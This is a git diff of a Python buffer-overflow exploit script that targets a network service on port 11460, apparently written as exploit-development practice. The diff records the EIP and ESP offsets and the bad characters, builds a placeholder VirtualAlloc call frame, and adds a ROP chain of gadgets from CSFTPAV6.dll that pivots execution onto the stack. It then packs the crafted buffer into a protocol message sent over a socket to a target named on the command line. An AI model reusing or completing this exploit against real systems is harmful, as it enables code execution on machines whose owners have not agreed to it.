@@ -45,6 +45,10 @@
 # buf += bytearray([0x45] * 0x2000)     # 3rd Buffer
 ===============================================================
 
+Used MSF-PATTERN_CREATE, found eip at offset 276
+                         found esp at offset 280
+
+BAD_CHARS = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]
 """
 
 import socket
@@ -52,6 +56,7 @@ import sys
 from struct import pack
 
 from colorama import Fore, Style, init
+from numpy import byte
 
 init()
 
@@ -71,8 +76,30 @@ buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34
 
 
 # psCommandBuffer
-pattern = b""
-buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (b"A" * 0x200, 0, 0, 0, 0)
+
+VirtualAlloc = pack("<L", (0x45454545))  # Dummy VirtualAlloc Addr
+VirtualAlloc += pack("<L", (0x46464646))  # Dummy VirtualAlloc Ret
+VirtualAlloc += pack("<L", (0x47474747))  # Dummy Shellcode Addr
+VirtualAlloc += pack("<L", (0x48484848))  # Dummy dwSize
+VirtualAlloc += pack("<L", (0x49494949))  # Dummy flAllocationType
+VirtualAlloc += pack("<L", (0x51515151))  # Dummy flProtect
+
+offset = b"A" * (276 - len(VirtualAlloc))
+eip = pack("<L", (0x50501110))  # CSFTPAV6.dll -> PUSH ESP; PUSH EAX; POP EDI; POP ESI; RET. This got me into the stack for exec
+rop = pack("<L", (0x5050118E))  #                 MOV EAX, ESI; POP ESI; RETN
+rop += pack("<L", (0x42424242))  # junk, added for alignment
+rop += pack("<L", (0x505115a3))  #             -> POP ECX, RET;
+rop += pack("<L", (0xffffffe4))  # -0x1c
+rop += pack("<L", (0x5051579a))  #             -> ADD EAX, ECX; RET
+  
+
+
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
+
+
+buffer = offset + VirtualAlloc + eip + rop
+
+buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
 buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04
 
 
@@ -127,6 +154,8 @@ def main():
 
     server = sys.argv[1]
     port = 11460
+
+    print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((server, port))
